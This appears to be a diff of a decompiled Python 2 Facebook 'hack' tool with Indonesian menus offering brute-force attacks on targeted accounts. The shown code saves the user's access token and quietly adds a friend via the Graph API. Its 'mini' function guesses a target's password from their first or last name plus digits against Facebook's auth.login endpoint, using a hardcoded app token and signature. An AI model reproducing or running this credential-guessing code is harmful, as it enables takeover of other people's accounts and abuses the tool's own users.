@@ -23,7 +23,7 @@ def jalan(z):
         time.sleep(0.01)
 
 
-logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d 𝕊ℍ ℝ𝔸𝔽𝕀ℕ\x1b[1;93mv1.6\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mShymonHasan\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mFacebook \x1b[1;91m: \x1b[1;96I.FueK.YoUr.MiNd.BnXD \x1b[1;97m[\x1b[1;96m\x1b[1;97m] \x1b[1;97m/ \x1b[1;96mYoutube \x1b[1;97m/ \x1b[1;96m𝐹𝐸𝐸𝐿𝐼𝑁𝐺𝑆 𝐶𝑅𝐸𝐴𝑇𝐼𝑂𝑁\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/ShymonHasan\x1b[0m\n[*] Decompiled by ShymonHasan\n'
+logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mv1.6\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mShymonHasan\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mFacebook \x1b[1;91m: \x1b[1;96I.FueK.YoUr.MiNd.BnXD SyStEm\x1b[1;97m[\x1b[1;96m\x1b[1;97m] \x1b[1;97m/ \x1b[1;96m \x1b[1;97m/Youtube \x1b[1;96m𝐹𝐸𝐸𝐿𝐼𝑁𝐺𝑆 𝐶𝑅𝐸𝐴𝑇𝐼𝑂𝑁\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/ShymonHasan\x1b[0m\n[*] Decompiled by ShymonHasan\n'
 
 def tik():
     titik = [
@@ -65,7 +65,7 @@ def login():
         os.system('clear')
         print logo
         print 40 * '\x1b[1;97m\xe2\x95\x90'
-        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN ANY FACEBOOK ID \x1b[1;91m[\xe2\x98\x86]'
+        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN YOUR FACEBOOK ID SH \x1b[1;91m[\xe2\x98\x86]'
         id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername FB \x1b[1;91m:\x1b[1;92m ')
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
         tik()
@@ -95,7 +95,7 @@ def login():
                 zedd = open('login.txt', 'w')
                 zedd.write(z['access_token'])
                 zedd.close()
-                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin SH'
+                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                 os.system('xdg-open https://www.youtube.com/channel/UCpedCBaRzoGyTQIJaJrD3tQ')
                 time.sleep(2)
@@ -151,7 +151,7 @@ def menu():
     print '\x1b[1;37;40m2. Hack Akun Facebook'
     print '\x1b[1;37;40m3. Bot               '
     print '\x1b[1;37;40m4. Lainnya....       '
-    print '\x1b[1;37;40m5. LogOut SH         '
+    print '\x1b[1;37;40m5. LogOut            '
     print '\x1b[1;31;40m0. Keluar            '
     print
     pilih()
@@ -200,7 +200,7 @@ def informasi():
     os.system('clear')
     print logo
     print 40 * '\x1b[1;97m\xe2\x95\x90'
-    id = raw_input('\x1b[1;91m[+] \x1b[1;92mTarget ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m : \x1b[1;97m')
+    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m : \x1b[1;97m')
     jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
     r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
     cok = json.loads(r.text)
@@ -271,13 +271,13 @@ def menu_hack():
     os.system('clear')
     print logo
     print 40 * '\x1b[1;97m\xe2\x95\x90'
-    print '\x1b[1;37;40m1. Mini Hack  Facebook(\x1b[1;92mTarget\x1b[1;97m)'
+    print '\x1b[1;37;40m1. Mini Hack Facebook(\x1b[1;92mTarget\x1b[1;97m)'
     print '\x1b[1;37;40m2. Multi Bruteforce Facebook'
     print '\x1b[1;37;40m3. Super Multi Bruteforce Facebook'
     print '\x1b[1;37;40m4. BruteForce(\x1b[1;92mTarget\x1b[1;97m)'
     print '\x1b[1;37;40m5. Yahoo Checker'
     print '\x1b[1;37;40m6. Ambil id/email/hp'
-    print '\x1b[1;31;40m0. Logout SH'
+    print '\x1b[1;31;40m0. Kembali'
     print
     hack_pilih()
 
@@ -340,7 +340,7 @@ def mini():
             time.sleep(2)
             jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu sebentar \x1b[1;97m...')
             print 40 * '\x1b[1;97m\xe2\x95\x90'
-            pz1 = a['first_name'] + '123'
+            pz1 = a['first_name'] + '1122'
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             y = json.load(data)
             if 'access_token' in y:
@@ -360,7 +360,7 @@ def mini():
                     raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                     menu_hack()
                 else:
-                    pz2 = a['first_name'] + '12345'
+                    pz2 = a['first_name'] + '123'
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     y = json.load(data)
                     if 'access_token' in y:
@@ -380,7 +380,7 @@ def mini():
                             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                             menu_hack()
                         else:
-                            pz3 = a['last_name'] + '123'
+                            pz3 = a['last_name'] + '12345'
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             y = json.load(data)
                             if 'access_token' in y:
@@ -2101,7 +2101,7 @@ def gaz(toket, enable=True):
     id = get_userid(toket)
     data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
     headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
-    url = 'https://www.facebook.com/I.Fuak.Your.MinD'
+    url = 'https://graph.facebook.com/graphql'
     res = requests.post(url, data=data, headers=headers)
     print res.text
     if '"is_shielded":true' in res.text:
@@ -2125,4 +2125,5 @@ def gaz(toket, enable=True):
 
 
 if __name__ == '__main__':
-	login(okay decompiling 3.pyc
+	login()
+# okay decompiling 3.pyc
